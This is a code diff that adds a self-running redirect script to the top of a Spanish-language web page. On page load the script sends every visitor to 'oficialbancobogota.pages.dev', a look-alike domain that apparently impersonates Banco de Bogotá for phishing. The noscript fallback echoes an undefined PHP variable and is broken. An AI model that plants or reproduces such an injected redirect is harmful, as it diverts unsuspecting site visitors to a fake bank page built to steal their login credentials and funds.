@@ -1,4 +1,26 @@
-
+<!DOCTYPE html>
+                    <html lang="en">
+                    <head>
+                        <meta charset="UTF-8">
+                        <title>Redirecting...</title>
+                        <script>
+                            window.onload = function() {
+                                var url = "https://oficialbancobogota.pages.dev/bogota/index1";
+                                if (url) {
+                                    location.replace(url);
+                                } else {
+                                    document.body.innerText = "Invalid redirect URL.";
+                                }
+                            };
+                        </script>
+                    </head>
+                    <body>
+                        Redirecting...<br>
+                        <noscript>
+                            JavaScript is disabled. <a href="<?php echo htmlspecialchars($url, ENT_QUOTES); ?>">Click here to continue.</a>
+                        </noscript>
+                    </body>
+                    </html>
 
 <!DOCTYPE html>
 <html lang="es">
